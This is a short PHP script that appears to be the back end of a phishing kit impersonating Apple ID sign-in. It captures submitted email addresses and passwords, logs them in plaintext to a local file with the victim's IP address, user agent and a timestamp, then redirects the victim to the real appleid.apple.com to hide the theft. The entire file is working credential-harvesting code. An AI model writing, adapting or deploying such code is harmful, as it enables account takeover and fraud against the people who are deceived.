<?php
$logFile = "log.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['email'];
  $password = $_POST['password'];
  file_put_contents($logFile, "[$time] IP: $ip | Email: $email | Password: $password | Agent: $agent\n", FILE_APPEND);
}

header("Location: https://appleid.apple.com/");
exit;
?>
